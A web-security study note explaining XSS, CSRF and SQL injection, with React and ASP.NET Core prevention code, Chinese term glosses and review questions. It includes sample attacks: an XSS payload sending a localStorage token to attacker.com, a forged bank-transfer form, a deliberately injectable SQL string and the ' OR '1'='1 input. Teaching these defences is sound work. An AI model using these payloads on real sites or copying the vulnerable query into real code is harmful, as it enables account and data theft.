# XSS, CSRF, And SQL Injection

## Core Idea

XSS, CSRF, and SQL injection are classic web security vulnerabilities.

Chinese notes:

- `XSS`: Cross-Site Scripting, 跨站脚本攻击.
- `CSRF`: Cross-Site Request Forgery, 跨站请求伪造.
- `SQL Injection`: SQL 注入.

## XSS

XSS happens when attacker-controlled JavaScript runs in a victim's browser.

Example risk:

```tsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

If `userInput` contains:

```html
<img src=x onerror="fetch('https://attacker.com?token=' + localStorage.token)">
```

the attacker may steal data.

## XSS Prevention

- React escapes text by default.
- Avoid `dangerouslySetInnerHTML`.
- Sanitize HTML if rich text is required.
- Use Content Security Policy.
- Do not store long-lived tokens in JavaScript-accessible storage if avoidable.
- Validate and encode output.

Safe React rendering:

```tsx
export function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
}
```

React escapes the text instead of treating it as HTML.

Risky rich text rendering:

```tsx
export function Article({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

Safer rich text rendering with sanitization:

```tsx
import DOMPurify from "dompurify";

export function Article({ html }: { html: string }) {
  const cleanHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

Content Security Policy example:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

CSP is defense-in-depth. It does not replace output encoding and sanitization.

## CSRF

CSRF tricks a user's browser into sending authenticated requests to another site.

It matters most when authentication uses cookies.

Example:

```html
<form action="https://bank.example.com/transfer" method="post">
  <input name="amount" value="1000" />
</form>
```

Browser may automatically include cookies.

## CSRF Prevention

- SameSite cookies;
- anti-forgery tokens;
- check Origin/Referer;
- do not use GET for state-changing actions;
- require custom headers for APIs;
- use CSRF protection when using cookie auth.

ASP.NET Core antiforgery setup:

```csharp
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
});
```

Token endpoint:

```csharp
app.MapGet("/api/auth/csrf", (HttpContext context, IAntiforgery antiforgery) =>
{
    var tokens = antiforgery.GetAndStoreTokens(context);
    return Results.Ok(new { csrfToken = tokens.RequestToken });
});
```

State-changing endpoint:

```csharp
app.MapPost("/api/orders", async (
    HttpContext context,
    IAntiforgery antiforgery,
    CreateOrderRequest request,
    IOrderService orders,
    CancellationToken ct) =>
{
    await antiforgery.ValidateRequestAsync(context);

    var order = await orders.CreateAsync(request, ct);
    return Results.Created($"/api/orders/{order.Id}", order);
});
```

Also avoid state-changing GET endpoints:

```http
GET /api/orders/123/cancel
```

Use:

```http
POST /api/orders/123/cancel
```

## SQL Injection

Bad:

```csharp
var sql = $"SELECT * FROM Users WHERE Email = '{email}'";
```

If email is:

```text
' OR '1'='1
```

query behavior changes.

## SQL Injection Prevention

Use parameterized queries.

EF Core LINQ:

```csharp
var user = await _dbContext.Users
    .FirstOrDefaultAsync(u => u.Email == email, ct);
```

Raw SQL with parameters:

```csharp
var users = await _dbContext.Users
    .FromSql($"SELECT * FROM Users WHERE Email = {email}")
    .ToListAsync(ct);
```

Dynamic sort whitelist:

```csharp
var orderBy = request.SortBy switch
{
    "email" => "Email",
    "createdAt" => "CreatedAt",
    _ => throw new ValidationException("Unsupported sort field.")
};

var users = await _dbContext.Users
    .FromSqlRaw($"SELECT * FROM Users ORDER BY {orderBy}")
    .AsNoTracking()
    .ToListAsync(ct);
```

The identifier is safe only because it comes from a whitelist. SQL parameters protect values, not table or column names.

Least-privilege database account:

```text
App login:
  can SELECT/INSERT/UPDATE needed tables
  cannot DROP TABLE
  cannot ALTER DATABASE
  cannot access unrelated schemas
```

Least privilege limits damage if injection or credential leakage happens.

## Combined Example: Safe Search Endpoint

```csharp
[HttpGet("users")]
public async Task<ActionResult<IReadOnlyList<UserListItemDto>>> SearchUsers(
    [FromQuery] string? email,
    [FromQuery] string sort = "-createdAt",
    CancellationToken ct = default)
{
    IQueryable<User> query = _dbContext.Users.AsNoTracking();

    if (!string.IsNullOrWhiteSpace(email))
    {
        query = query.Where(u => u.Email.Contains(email));
    }

    query = sort switch
    {
        "email" => query.OrderBy(u => u.Email),
        "-email" => query.OrderByDescending(u => u.Email),
        "createdAt" => query.OrderBy(u => u.CreatedAt),
        "-createdAt" => query.OrderByDescending(u => u.CreatedAt),
        _ => query.OrderByDescending(u => u.CreatedAt)
    };

    var users = await query
        .Take(50)
        .Select(u => new UserListItemDto(u.Id, u.Email, u.DisplayName))
        .ToListAsync(ct);

    return Ok(users);
}
```

This avoids SQL string concatenation and keeps sorting on a whitelist.

## Review Questions

### How does React help prevent XSS?

> React escapes string values rendered in JSX by default. However, XSS is still possible through `dangerouslySetInnerHTML`, unsafe third-party HTML, URL injection, or compromised dependencies.

### When is CSRF a risk?

> CSRF is mainly a risk when browsers automatically send credentials such as cookies. Token-in-header APIs are less exposed to classic CSRF but still need XSS protection.

### How do you prevent SQL injection?

> Use parameterized queries or ORM-generated parameters, avoid string concatenation, validate input, and use least-privilege database accounts.

## Common Mistakes

- Thinking React makes XSS impossible.
- Using localStorage tokens and ignoring XSS.
- Cookie auth without CSRF protection.
- GET endpoints that modify state.
- Concatenating raw SQL.
- Trusting frontend validation.

## Practice Task

Create examples for:

1. safe React text rendering;
2. unsafe HTML rendering and sanitized fix;
3. CSRF-protected cookie API;
4. SQL injection vulnerable query;
5. parameterized query fix.
